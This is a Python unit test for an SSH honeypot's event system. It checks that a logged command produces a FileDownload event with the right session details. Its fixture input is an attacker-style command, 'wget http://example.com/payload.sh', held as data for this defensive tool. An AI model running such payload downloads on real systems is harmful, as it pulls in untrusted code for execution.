from panopticon.events.models import FileDownload
from panopticon.honeypots.ssh.context import SSHCommandContext, SSHSessionContext


class FakeEventHandler:
    events: list[object]

    def __init__(self) -> None:
        self.events = []

    def publish_background(self, event: object) -> None:
        self.events.append(event)


def test_command_context_emit_publishes_event() -> None:
    event_handler = FakeEventHandler()
    session = SSHSessionContext(
        id="test-session",
        src_ip="127.0.0.1",
        src_port=5555,
        start_time=1.0,
    )
    context = SSHCommandContext(
        input="wget http://example.com/payload.sh",
        name="wget",
        args=["http://example.com/payload.sh"],
        session=session,
        chan=None,
        conn=None,
        event_handler=event_handler,
    )

    context.emit(
        event_type=FileDownload,
        input=context.input,
        tool="wget",
        url=context.args[0],
        destination=None,
    )

    assert len(event_handler.events) == 1

    event = event_handler.events[0]

    assert isinstance(event, FileDownload)
    assert event.session_id == "test-session"
    assert event.src_ip == "127.0.0.1"
    assert event.src_port == 5555
    assert event.tool == "wget"
